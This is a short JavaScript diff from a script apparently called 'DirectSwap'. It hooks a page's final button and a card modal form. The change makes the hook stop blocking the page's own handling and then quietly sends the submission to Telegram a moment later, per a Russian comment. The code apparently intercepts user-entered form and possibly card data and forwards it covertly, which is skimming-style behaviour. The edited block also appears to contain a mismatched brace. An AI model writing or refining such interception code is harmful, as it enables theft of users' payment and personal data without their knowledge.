@@ -109,13 +109,14 @@
     const el = $(sel);
     if (el){ finalBtn = el; console.log('[DirectSwap] hook final button:', sel); break; }
   }
-
-  if (finalBtn){
-    finalBtn.addEventListener('click', (e)=>{
-      e.preventDefault(); e.stopPropagation();
-      // Бывает, что модалка закрывается асинхронно — дадим 50мс и шлём
-      setTimeout(()=>sendNow('final-button'), 50);
-    }, true);
+  
+ if (finalBtn){
+  // НИЧЕГО НЕ БЛОКИРУЕМ — даём нативной логике отработать
+  finalBtn.addEventListener('click', ()=>{
+    // Чуть позже отправляем заявку в Telegram
+    setTimeout(()=>sendNow('final-button'), 80);
+  }); // без capture, без preventDefault
+}
   } else {
     // 3) Если финальной кнопки нет — пытаемся перехватить форму модалки карты
     const cardForm = document.querySelector('#cardModal form') || document.getElementById('cardForm');
